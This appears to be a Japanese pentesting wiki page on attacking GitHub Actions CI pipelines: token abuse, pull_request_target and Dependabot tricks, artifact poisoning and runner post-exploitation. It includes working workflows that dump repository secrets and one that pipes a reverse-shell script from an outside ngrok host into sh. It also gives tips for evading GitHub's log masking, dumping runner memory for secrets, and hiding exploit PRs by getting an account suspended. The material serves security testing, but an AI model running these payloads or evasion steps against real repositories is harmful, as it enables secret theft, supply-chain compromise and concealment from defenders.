# Github Actionsの悪用

{{#include ../../../banners/hacktricks-training.md}}

## ツール

次のツールは、Github Actionのワークフローを見つけたり、脆弱なものを発見するのに便利です：

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - チェックリストは [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits) も参照してください

## 基本情報

このページでは以下を扱います：

- 攻撃者がGithub Actionにアクセスした場合の**すべての影響の要約**
- アクションに**アクセスするさまざまな方法**:
- アクションを作成するための**権限**を持つこと
- **pull request**関連のトリガーを悪用する
- その他の**外部アクセス**技術を悪用する
- 既に侵害されたリポジトリからの**Pivoting**
- 最後に、アクションの内部から悪用するための**post-exploitation techniques**に関するセクション（前述の影響を引き起こす）

## 影響の概要

導入としては[**Github Actions の基本情報を確認してください**](../basic-github-information.md#github-actions)。

もしリポジトリ内で**GitHub Actions上で任意のコードを実行できる**なら、次のことが可能になるかもしれません：

- パイプラインにマウントされた**secretsを盗み**、パイプラインの権限を**悪用して**AWSやGCPなどの外部プラットフォームに不正アクセスする。
- デプロイを**侵害**し、その他の**artifacts**も影響を受ける。
- パイプラインがアセットをデプロイまたは保存している場合、最終製品を改変でき、サプライチェーン攻撃を可能にする。
- カスタムワーカーで**コードを実行**し、計算資源を悪用して他のシステムへpivotする。
- `GITHUB_TOKEN` に関連する権限によっては、リポジトリのコードを**上書き**することができる。

## GITHUB_TOKEN

この「**secret**」（`${{ secrets.GITHUB_TOKEN }}` と `${{ github.token }}` から提供される）は、管理者がこのオプションを有効にしたときに付与されます：

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

このトークンは**Github Applicationが使用するものと同じ**ため、同じエンドポイントにアクセスできます: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github は [**flow**](https://github.com/github/roadmap/issues/74) をリリースすべきで、GitHub内で**クロスリポジトリ**アクセスを許可し、リポジトリが `GITHUB_TOKEN` を使用して他の内部リポジトリにアクセスできるようにする。

このトークンの可能な**権限**は次で確認できます: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

このトークンは**ジョブ完了後に有効期限切れになる**点に注意してください。\
これらのトークンは次のような形式です: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

このトークンでできる興味深いこと:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> いくつかの場面で、**github user tokens inside Github Actions envs or in the secrets** を見つけられることがあります。これらのトークンはリポジトリや組織に対してより多くの権限を与える可能性があります。

<details>

<summary>Github Action の出力に含まれる secrets を一覧表示</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secrets を使って reverse shell を取得する</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

別のユーザーのリポジトリに対して与えられている Github Token の権限は、actions のログを確認することでチェックできます **checking the logs**:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Allowed Execution

> [!NOTE]
> これは Github actions を侵害する最も簡単な方法です。というのも、このケースはあなたが **create a new repo in the organization** できるか、または **write privileges over a repository** を持っていることを前提としているからです。
>
> このような状況にある場合、[Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action) を確認してください。

### Execution from Repo Creation

組織のメンバーが **create new repos** でき、かつあなたが github actions を実行できる場合、**create a new repo and steal the secrets set at organization level** ことができます。

### Execution from a New Branch

既に Github Action が設定されているリポジトリに **create a new branch** できる場合、それを **modify** し、コンテンツを **upload** して、その新しいブランチからそのアクションを **execute** できます。こうしてリポジトリおよび組織レベルのsecretsを **exfiltrate** できます（ただし、secrets がどのように呼ばれているかを知っている必要があります）。

> [!WARNING]
> ワークフロー YAML の内部だけで実装された制限（例えば、`on: push: branches: [main]`、job の条件式、または手動ゲート）はコラボレーターによって編集可能です。外部による強制（branch protections、protected environments、protected tags）がなければ、寄稿者はワークフローを自分のブランチで動作するようにリターゲットし、マウントされた secrets/permissions を悪用できます。

改変したアクションは、手動で、**PR が作成されたとき**や**コードがプッシュされたとき**に実行可能にできます（どれだけ目立ちたいかによります）：
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## フォークされた実行

> [!NOTE]
> 攻撃者が**別のリポジトリの Github Action を実行する**ことを可能にするさまざまなトリガーがあります。これらのトリガー可能なアクションが不適切に構成されていると、攻撃者はそれらを悪用できる可能性があります。

### `pull_request`

ワークフロートリガー **`pull_request`** は、いくつかの例外を除き、プルリクエストを受け取るたびにワークフローを実行します。デフォルトでは**初回**のコラボレーションの場合、いくつかの**メンテイナー**がワークフローの**実行**を**承認**する必要があります:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> デフォルトの制限は**初回の貢献者**に対するものなので、正当なバグ修正やタイポ修正で貢献した後に、**新たに得た `pull_request` 権限を悪用するための別の PR を送る**ことが可能になります。
>
> **私はこれを試しましたがうまくいきませんでした**: ~~別の選択肢としては、プロジェクトに貢献した誰かの名前でアカウントを作成し、そのアカウントを削除する、という方法が考えられます。~~

さらに、デフォルトでは対象リポジトリへの**書き込み権限の付与**と**シークレットへのアクセス**を防ぎます。詳細は[**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)を参照してください:

> `GITHUB_TOKEN` を除き、ワークフローが**フォークされたリポジトリ**からトリガーされた場合、**シークレットはランナーに渡されません**。**`GITHUB_TOKEN` はフォークされたリポジトリからの pull request では読み取り専用の権限を持ちます。**

攻撃者は Github Action の定義を変更して任意の処理を実行したり任意のアクションを追加したりすることができます。しかし、前述の制限によりシークレットを盗んだりリポジトリを書き換えたりすることはできません。

> [!CAUTION]
> **はい、もし攻撃者が PR でトリガーされる Github Action を変更した場合、使用されるのは元リポジトリのものではなく攻撃者の Github Action になります！**

攻撃者は実行されるコードも制御しているため、`GITHUB_TOKEN` にシークレットや書き込み権限がなくても、例えば**悪意あるアーティファクトをアップロードする**ことが可能です。

### **`pull_request_target`**

ワークフロートリガー **`pull_request_target`** は対象リポジトリへの**書き込み権限**と**シークレットへのアクセス**を持ちます（権限承認を求められません）。

ワークフロートリガー **`pull_request_target`** は **ベースのコンテキストで実行され**、PR 側のコンテキストでは実行されないことに注意してください（**信頼できないコードを実行しないため**）。`pull_request_target` の詳細は[**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target)を参照してください。\
さらに、この特定の危険な使用法については[**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)を参照してください。

ベースで定義されたワークフローが実行され**PR 内のものではない**ため、**`pull_request_target` の使用は安全**に見えるかもしれませんが、**安全でない場合がいくつかあります**。

そしてこちらは**シークレットへのアクセス**を持ちます。

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger allows to run a workflow from a different one when it's `completed`, `requested` or `in_progress`.

In this example, a workflow is configured to run after the separate "Run Tests" workflow completes:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

この種類の workflow は、外部ユーザーが **`pull_request`** または **`pull_request_target`** 経由でトリガーできる **workflow** に依存している場合、攻撃される可能性があります。いくつかの脆弱な例は [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** 最初の例は **`workflow_run`** によってトリガーされた workflow が攻撃者のコードをダウンロードすることです: `${{ github.event.pull_request.head.sha }}`\
2つ目の例は、**untrusted** コードから **artifact** を **`workflow_run`** ワークフローに渡し、そのアーティファクトの内容を RCE に対して **vulnerable** になるように使用するものです。

### `workflow_call`

TODO

TODO: pull_request から実行されたとき、使用/ダウンロードされるコードがオリジナルのリポジトリのものか、フォークされた PR のものかを確認する

## Abusing Forked Execution

外部攻撃者が github workflow を実行させることができる方法については既に述べました。次に、これらの実行が不適切に設定されている場合にどのように悪用され得るかを見てみましょう:

### Untrusted checkout execution

`pull_request` の場合、workflow は **PR のコンテキスト** で実行されます（つまり **malicious PR のコード** が実行されます）が、誰かが **まずそれを authorize する必要があり**、[limitations](#pull_request) が適用されます。

`pull_request_target` または `workflow_run` を使用する workflow で、`pull_request_target` や `pull_request` からトリガー可能な workflow に依存している場合は、オリジナルリポジトリのコードが実行されるため、**攻撃者は実行されるコードを制御できません**。

> [!CAUTION]
> ただし、もしその **action** が **明示的な PR checkout** を行い **PR からコードを取得する**（base ではなく）場合、攻撃者が制御するコードが使用されます。例えば（行12で PR のコードがダウンロードされているのを確認してください）:

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

潜在的に **untrusted なコードが `npm install` や `npm build` の実行中に走る** ことになります。build スクリプトや参照される **packages は PR の作成者によって制御されている**ためです。

> [!WARNING]
> 脆弱な actions を検索するための github dork は: `event.pull_request pull_request_target extension:yml` ですが、action が insecure に設定されていても、ジョブを安全に実行するように設定する方法はいくつかあります（例えば PR を作成した actor に関する条件分岐を使うなど）。

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Note that there are certain [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) whose values are **controlled** by the **user** creating the PR. If the github action is using that **data to execute anything**, it could lead to **arbitrary code execution:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

From the docs: You can make an **environment variable available to any subsequent steps** in a workflow job by defining or updating the environment variable and writing this to the **`GITHUB_ENV`** environment file.

もし攻撃者がこの **env** 変数に任意の値を **inject** できるなら、後続のステップでコードを実行させ得るような env 変数（例えば **LD_PRELOAD** や **NODE_OPTIONS**）を注入できます。

例えば（[**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) と [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project) を参照）、アップロードされた artifact の内容を **`GITHUB_ENV`** に格納することを信頼している workflow を想像してください。攻撃者はそれを悪用するために次のようなものをアップロードできます:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

As indicated in [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), several organizations have a Github Action that merges any PRR from `dependabot[bot]` like in:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Which is a problem because the `github.actor` field contains the user who caused the latest event that triggered the workflow. And There are several ways to make the `dependabot[bot]` user to modify a PR. For example:

- 標的リポジトリをフォークする
- 自分のコピーに悪意あるペイロードを追加する
- フォークでDependabotを有効にし、古い依存関係を追加する。Dependabotはその依存関係を修正するブランチを作成し、そこに悪意あるコードが入っている
- そのブランチから標的リポジトリにPull Requestを作成する（PRはユーザーによって作成されるため、まだ何も起こらない）
- その後、攻撃者は自分のフォークでDependabotが最初に作成したPRに戻り、`@dependabot recreate` を実行する
- すると、Dependabotはそのブランチでいくつかの操作を行い、標的リポジトリ上のPRが変更される。その結果、最新のイベントのアクターが `dependabot[bot]` になり（したがってワークフローが実行される）

Moving on, what if instead of merging the Github Action would have a command injection like in:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Well, the original blogpost proposes two options to abuse this behavior being the second one:

- 被害者のリポジトリをフォークし、古い依存関係で Dependabot を有効にする。
- 悪意のある shell injection コードを含む新しいブランチを作成する。
- リポジトリのデフォルトブランチをそれに変更する。
- このブランチから被害者のリポジトリへ PR を作成する。
- 彼のフォークで Dependabot が開いた PR 内で `@dependabot merge` を実行する。
- Dependabot はフォークしたリポジトリのデフォルトブランチに変更をマージし、被害者リポジトリの PR を更新する。これにより、ワークフローをトリガーした最新イベントのアクターが `dependabot[bot]` になり、悪意のあるブランチ名が使用される。

### 脆弱なサードパーティの Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

As mentioned in [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), this Github Action allows to access artifacts from different workflows and even repositories.

問題は、**`path`** パラメータが設定されていない場合、artifact がカレントディレクトリに展開され、後でワークフロー内で使用されたり実行されたりする可能性のあるファイルを上書きしてしまう点です。したがって、Artifact が脆弱であれば、攻撃者はこれを悪用して Artifact を信頼する他のワークフローを侵害することができます。

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
これは次のワークフローで攻撃できます:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## その他の外部アクセス

### Deleted Namespace Repo Hijacking

アカウントが名前を変更すると、しばらくして別のユーザがその名前でアカウントを登録できる可能性があります。リポジトリが**less than 100 stars previously to the change of name**だった場合、Github は同じ名前を持つ新しいユーザが削除されたものと同じ**repository with the same name**を作成することを許可します。

> [!CAUTION]
> したがって、ある action が存在しないアカウントの repo を参照している場合でも、攻撃者がそのアカウントを作成して action を compromise する可能性があります。

もし他のリポジトリがこのユーザの repos からの **dependencies** を利用していた場合、攻撃者はそれらをハイジャックできるようになります。詳しい説明はこちら: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> このセクションでは、最初の repo に何らかのアクセスがあると仮定して、**pivot from one repo to another** を可能にする技術について説明します（前のセクションを参照してください）。

### Cache Poisoning

A cache is maintained between **wokflow runs in the same branch**。つまり、攻撃者が**compromise**した**package**をキャッシュに保存し、その後より権限の高い workflow によって**downloaded**および実行されると、その workflow も**compromise**される可能性があります。

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows は **artifacts from other workflows and even repos** を利用することがあります。攻撃者が後で別の workflow によって使用される artifact を **uploads an artifact** する Github Action を**compromise**できれば、別の workflow も**compromise**する可能性があります:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

[**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass) で述べられているように、リポジトリや組織が特定の actions の利用を制限するポリシーを持っていても、攻撃者は単にワークフロー内で action をクローン（`git clone`）してローカル action として参照することができます。ポリシーはローカルパスに影響しないため、**その action は制限なしに実行されます。**

Example:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### OIDC 経由での AWS と GCP へのアクセス

次のページを確認してください:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### 秘密へのアクセス <a href="#accessing-secrets" id="accessing-secrets"></a>

スクリプトにコンテンツを注入する場合、シークレットへどのようにアクセスできるかを知っておくと役に立ちます:

- シークレットやトークンが **環境変数** に設定されている場合、**`printenv`** を使って環境から直接取得できます。

<details>

<summary>Github Action の出力にシークレットを一覧表示</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secrets を使って reverse shell を取得する</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- secretが**直接式で使用される**場合、生成されたシェルスクリプトは**ディスク上に保存**され、アクセス可能になります。
- ```bash
cat /home/runner/work/_temp/*
```
- JavaScript actionsの場合、secretsは環境変数を通して渡されます
- ```bash
ps axe | grep node
```
- For a **custom action**, プログラムが**argument**から取得したsecretをどのように使用するかによってリスクは異なります:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- secrets contextを使ってすべてのsecretsを列挙します（collaborator level）。書き込み権限を持つcontributorは任意のブランチのworkflowを変更して、リポジトリ/org/environmentのすべてのsecretsをダンプできます。GitHubのログマスキングを回避するためにdouble base64を使い、ローカルでデコードしてください:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

ローカルでデコード:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: テスト時のステルスのため、出力前に暗号化してください（opensslはGitHub-hosted runnersにプリインストールされています）。

### Self-hosted runnersの悪用

非GitHubインフラで実行されている**Github Actionsを見つける方法**は、Github Action設定yamlで**`runs-on: self-hosted`**を検索することです。

**Self-hosted** runnersは**追加の機密情報**や他の**ネットワークシステム**（ネットワーク内の脆弱なエンドポイント？メタデータサービス？）にアクセスできる可能性があります。たとえ隔離され破棄される場合でも、**複数のactionが同時に実行されることがあり**、悪意あるものが他のactionの**secretsを奪う**可能性があります。

self-hosted runnersでは、メモリをダンプすることで、ワークフローの任意のステップのすべてのsecretsを含む**secrets from the \_Runner.Listener**\_\*\* process\*\*を取得することも可能です:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Check [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images レジストリ

Github actions を使って **Docker image をビルドして Github 内に保存する** ワークフローを作成することが可能です。\
例は以下の展開可能なセクションにあります:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

前述のコードから分かるように、Github レジストリは **`ghcr.io`** にホストされています。

リポジトリに対して読み取り権限を持つユーザーは、personal access token を使用して Docker Image をダウンロードできます:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
その後、ユーザーは**leaked secrets in the Docker image layers:**を検索できます：

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Github Actions ログの機密情報

たとえ**Github**がアクションログ内の**シークレット値を検出し**、**表示を抑える**ようにしても、アクション実行中に生成され得る**その他の機密データ**は隠されません。例えば、秘密値で署名されたJWTは[特別に設定されていない限り](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)非表示になりません。

## 痕跡の隠蔽

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) まず、作成されたPRはGithub上で公衆およびターゲットのGitHubアカウントから明確に見えます。GitHubではデフォルトでインターネット上のPRを**削除することはできません**が、ここにひとつの裏技があります。Githubによってアカウントが**suspended**されると、そのアカウントのすべての**PRsは自動的に削除され**インターネットから取り除かれます。したがって、自分の活動を隠すには、自分の**GitHub account suspended or get your account flagged**ように仕向ける必要があります。これによりGitHub上のあなたのすべての活動がインターネットから**隠されます**（基本的にはエクスプロイトPRをすべて削除することになります）。

An organization in GitHub is very proactive in reporting accounts to GitHub. All you need to do is share “some stuff” in Issue and they will make sure your account is suspended in 12 hours :p and there you have, made your exploit invisible on github.

> [!WARNING]
> 組織が自分たちが標的になったことを把握する唯一の方法は、GitHub UIからはPRが削除されるため、SIEMからGitHubログを確認することです。

## References

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
